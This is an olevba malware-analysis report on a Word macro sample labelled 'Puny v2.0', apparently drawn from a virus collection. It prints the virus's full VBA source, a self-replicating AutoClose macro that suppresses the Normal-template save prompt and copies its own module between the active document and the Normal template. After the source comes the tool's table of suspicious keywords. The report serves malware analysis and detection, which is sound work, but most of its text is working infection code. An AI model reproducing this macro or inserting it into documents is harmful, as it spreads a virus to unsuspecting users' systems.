olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Source-99d0e3752e91fb5b214a3e55ef7daec7dafa6b43
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSOffice.Source-99d0e3752e91fb5b214a3e55ef7daec7dafa6b43 
in file: Virus.MSOffice.Source-99d0e3752e91fb5b214a3e55ef7daec7dafa6b43 - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
    'Puny v2.0 WalruS
    On Error Resume Next
    Options.SaveNormalPrompt = False
    Set N = NormalTemplate.VBProject.VBComponents: Set D = ActiveDocument.VBProject.VBComponents: P = "C:\P"
If N.Item("Puny").Name <> "Puny" Then
    D("Puny").Export P: Set i = NormalTemplate.VBProject
ElseIf D.Item("Puny").Name <> "Puny" Then
    N("Puny").Export P: Set i = ActiveDocument.VBProject
End If
i.VBComponents.Import P
ActiveDocument.Save
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

